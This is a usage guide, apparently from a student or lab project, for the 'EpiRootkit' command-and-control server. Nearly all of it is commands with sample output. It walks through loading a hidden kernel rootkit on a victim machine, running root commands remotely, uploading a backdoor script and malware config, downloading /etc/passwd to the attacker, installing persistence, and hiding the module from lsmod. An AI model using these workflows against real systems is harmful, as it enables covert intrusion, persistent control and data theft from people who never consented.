---
title: "Usage Guide"
description: "Comprehensive usage scenarios and workflows"
icon: "menu_book"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T16:00:00+01:00"
draft: false
toc: true
weight: 304
---

# Usage Guide

Complete workflows and usage scenarios for the EpiRootkit C2 server.

## Getting Started

### 1. Start the C2 Server
```bash
cd attacking_program
pnpm start
```

### 2. Wait for Rootkit Connection
```bash
# On victim machine
sudo insmod epirootkit.ko

# C2 server will show:
┌─ Client-1
  ✓ [2025-05-25 16:13:29] Connected
└─
```

### 3. Authenticate
```bash
c2-server$ auth Client-1 <password> (default: password)
┌─ Client-1
  ✓ [2025-05-25 16:13:30] Authenticated
└─
```

#### Brute Force Protection

Rate limit to 5 attempts per 60 seconds.

## Basic Workflows

### Client Management Workflow

#### List and Monitor Clients
```bash
# List all connected clients
c2-server$ ls
┌─ Connected Clients
  • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM
  • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM
└─

# Check specific client status
c2-server$ status Client-1
┌─ Client-1
  • [2025-05-25 16:13:30] Command result:
  • EpiRootkit Status:
  • Version: 1.0.0
  • Authentication: YES
  • Connection: CONNECTED
  • Module Hidden: YES
  • Encryption: DISABLED
  • Persistence: ENABLED
└─

# Monitor connection health
c2-server$ keepalive Client-1
┌─ Client-1
  • [2025-05-25 16:13:31] Command result:
  • Keepalive Status:
  • Last ping sent: 2025-05-25 16:14:00
  • Connection stable: YES
└─
```

### Command Execution Workflow

#### Basic System Commands
```bash
# Check user privileges
c2-server$ exec Client-1 whoami
┌─ Client-1
  • [2025-05-25 16:13:32] Command result:
  • root
└─

# System information
c2-server$ exec Client-1 uname -a
┌─ Client-1
  • [2025-05-25 16:13:33] Command result:
  • Linux victim 5.4.0-74-generic #83-Ubuntu SMP Wed Apr 29 23:25:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
└─

```


### File Transfer Workflow

#### Upload Files to Victim
```bash
# Upload a script
c2-server$ upload Client-1 ./scripts/backdoor.sh /tmp/backdoor.sh
┌─ File Upload
  • Uploading ./scripts/backdoor.sh → /tmp/backdoor.sh
  ✓ Upload initiated
└─

# Upload configuration
c2-server$ upload Client-1 ./configs/malware.conf /etc/malware.conf
┌─ File Upload
  • Uploading ./configs/malware.conf → /etc/malware.conf
  ✓ Upload initiated
└─

# Verify upload
c2-server$ exec Client-1 ls -la /tmp/backdoor.sh
c2-server$ exec Client-1 chmod +x /tmp/backdoor.sh
```

#### Download Files from Victim
```bash
# Download sensitive files
c2-server$ download Client-1 /etc/passwd ./victim_passwd
┌─ File Download
  • Downloading /etc/passwd → ./victim_passwd
  ✓ Download request sent
└─
```

## Advanced Workflows

### Persistence Management

#### Install Persistence
```bash
# Interactive persistence menu
c2-server$ persist Client-1
┌─ Persistence Management - Client-1
  • Install All Methods
  • Remove All Methods
  • Install Specific Method
  • Show Status
  • Exit

? Select persistence action: Install All Methods
┌─ Installing Persistence
  • Installing all persistence mechanisms on Client-1...
  ✓ all persistence mechanisms installation command sent
└─

# Install specific method
c2-server$ persist Client-1 install modules
┌─ Installing Persistence
  • Installing modules-load.d persistence on Client-1...
  ✓ modules-load.d persistence installation command sent
└─
```


### Stealth Configuration

#### Interactive Configuration
```bash
c2-server$ config Client-1
┌─ Configuration - Client-1
  • Fetching current status...

  Current Configuration:
  [X] Module Hiding (Click to disable)
  [ ] Persistence (Click to enable)
  Refresh Status
  Exit

? Select option: [X] Module Hiding (Click to disable)
┌─ Configuration - Client-1
  • Applying configuration change...
  ✓ Configuration updated
└─
```

#### Manual Stealth Commands
```bash
# Hide module from lsmod
c2-server$ exec Client-1 lsmod | grep epirootkit
# (should show module)

# Enable hiding
c2-server$ status Client-1
# Check if "Module Hidden: YES"

# Verify hiding
c2-server$ exec Client-1 lsmod | grep epirootkit
# (should show no output if hidden)
```

